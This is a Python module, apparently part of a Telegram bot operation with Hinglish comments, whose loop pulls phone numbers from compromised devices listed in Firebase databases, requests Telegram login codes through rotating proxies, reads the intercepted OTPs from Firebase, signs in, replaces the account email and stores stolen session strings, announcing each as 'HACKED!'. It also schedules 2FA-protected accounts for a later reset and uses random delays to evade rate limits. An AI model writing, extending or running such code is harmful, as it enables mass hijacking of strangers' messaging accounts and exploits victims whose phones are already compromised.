# services/telegram_automation.py
# ... (imports same rahenge)

# 🚨 4. Ghatak Auto-Hunter Loop (Firebase) - SLOWED DOWN
async def auto_hunter_loop(bot):
    log.info("🔥 GHATAK AUTO-HUNTER STARTED (Slow Mode)...")
    while True:
        try:
            d = db.load_data()
            if not d.get("hunting_enabled", True):
                await asyncio.sleep(10)
                continue

            online_devices = []
            for fb in d.get("firebases", [])[:10]:
                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                if not clients or not isinstance(clients, dict): continue
                for dev_id, c in clients.items():
                    if isinstance(c, dict) and c.get("status") is True:
                        online_devices.append((fb, dev_id, c))

            for fb, dev_id, dev_data in online_devices:
                best_nums = fbu.extract_best_numbers(dev_data, [])
                if not best_nums: continue
                phone = f"+91{best_nums[0][0]}"
                
                if phone in d.get("telegram_accounts", {}) and d["telegram_accounts"][phone].get("status") == "active":
                    continue
                
                # 🚨 DELAY: Har number ke beech 1 se 3 minute ka gap
                delay = random.randint(60, 180)
                log.info(f"Hunter sleeping for {delay} seconds before targeting {phone}...")
                await asyncio.sleep(delay)
                
                # Refresh data after sleep
                d = db.load_data()
                if phone in d.get("telegram_accounts", {}) and d["telegram_accounts"][phone].get("status") == "active":
                    continue

                await update_owner_progress(bot, f"🎯 Target: <code>{phone}</code>\n📱 Device: <code>{dev_id[:8]}</code>")
                
                app = None
                sent_code = None
                
                for attempt in range(2):
                    proxy_dict = get_proxy(d, attempt)
                    try:
                        app = Client(f"temp_{phone.replace('+','')}", api_id=config.TG_API_ID, api_hash=config.TG_API_HASH, phone_number=phone, in_memory=True, proxy=proxy_dict)
                        await app.connect()
                        sent_code = await app.send_code(phone)
                        break
                    except FloodWait as e:
                        log.warning(f"FloodWait on {phone}! Waiting {e.value} seconds...")
                        if app and app.is_connected: await app.disconnect()
                        # Yahan hum wait nahi karenge, next number pe jayenge
                        sent_code = None
                        break
                    except Exception as e:
                        if app and app.is_connected: await app.disconnect()
                        log.warning(f"Hunter attempt {attempt+1} failed: {e}")

                if not sent_code: 
                    continue

                otp = await wait_for_firebase_otp(phone)
                if not otp:
                    if app and app.is_connected: await app.disconnect()
                    continue
                
                try:
                    await app.sign_in(phone, sent_code.phone_code_hash, otp)
                    await app.update_profile(email=config.MASTER_EMAIL)
                    session_string = await app.export_session_string()
                    d = db.load_data()
                    d["telegram_accounts"][phone] = {"status": "active", "session": session_string, "device_id": dev_id, "fb_url": fb['url']}
                    db.save_data(d)
                    await update_owner_progress(bot, f"✅ <b>HACKED!</b> <code>{phone}</code>")
                except SessionPasswordNeeded:
                    d = db.load_data()
                    d["telegram_accounts"][phone] = {"status": "waiting_7_days", "session": "", "reset_time": int(time.time()) + (7*24*3600), "device_id": dev_id}
                    db.save_data(d)
                except Exception as e:
                    log.error(f"Sign-in failed: {e}")
                finally:
                    if app and app.is_connected: await app.disconnect()

            await asyncio.sleep(30) # Loop ke end me 30 sec wait
        except Exception as e:
            log.error(f"Hunter Loop Error: {e}")
            await asyncio.sleep(30)

# ... (baaki functions: reset_watchdog_loop, initiate_user_login, complete_user_login same rahenge)
